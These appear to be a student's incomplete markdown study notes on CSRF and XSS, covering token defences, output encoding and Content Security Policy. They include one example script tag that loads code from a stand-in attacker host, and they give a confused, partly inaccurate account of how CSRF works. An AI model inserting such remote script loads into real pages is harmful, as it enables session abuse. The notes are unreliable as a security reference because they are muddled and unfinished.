<!-- TOC depth:6 withLinks:1 updateOnSave:1 orderedList:0 -->

		- [Cross Site Request Forgery](#cross-site-request-forgery)
			- [Prevention](#prevention)
				- [Add a secret that the attacker cannot guess](#add-a-secret-that-the-attacker-cannot-guess)
				- [Re-authenticate for critical operations](#re-authenticate-for-critical-operations)
				- [Logging off one site before using others](#logging-off-one-site-before-using-others)
		- [What is XSS?](#what-is-xss)
		- [Prevention](#prevention)
			- [Output Filtering/Encoding](#output-filteringencoding)
			- [CSP](#csp)
				- [SOP and XSS](#sop-and-xss)
<!-- /TOC -->

link: http://www-sop.inria.fr/members/Tamara.Rezk/teaching/caspar/web3.tar.gz

### Cross Site Request Forgery

[![](https://i.imgur.com/T5tobo8.png)](https://drive.google.com/file/d/0B84giOOCNV1zby0xQ0c3UzYwNVk/view?usp=sharing) The attacker code include the attacker code from another server, in this case, attacker server.

```
<script src:"http://atackerserver.com/jquery"></script>
```

This is the process CSRF.

1.	Execute attacker code JS
2.	Load from attacker server code
3.	The client execute the code received by AJAX process. This code send the request to Trusted server the service that want to attack. For example, getContactList service. This is posible because have the client cookie and the server think that is the client who do the request.

***Complete with more information about it***

#### Prevention

##### Add a secret that the attacker cannot guess

If we use a token, we prevent this attack. This token is a number generated randomly. So the html have in URL requests the token as GET parameter. And the request from attacker code don't have this token, this random number. Then the browser always send the cookie but the trusted server will know that is a attack because don't have the token. BUT, the attacker code, can analise the DOM and find the token code. this token can find because is JS imported, but if it is a iframe, this code wouldn't can access the DOM.

##### Re-authenticate for critical operations

##### Logging off one site before using others

XSS
---

code injection is esencialy execute code from attacker. this can execute in: - SQL - JavaScript - Server side

If the code is executed in server, this is know injection and if the code is executed in client is know as XSS.

###What is XSS?

### Prevention

#### Output Filtering/Encoding

-	Remove, encode HTML special charts
-	Allow only safe commands

**NOTE: USE XSS CHEAT SHEET**

#### CSP

the code is not acepted if link is another server that the declared in CSP.

And the code is not acepted if the code is inline, so it's included in HTML.

The injection that include the script in URL and the server print GET variable, is not found, because the server print this code as inline code.

This isn't enought because all the user don't have the last version of browsers.

##### SOP and XSS
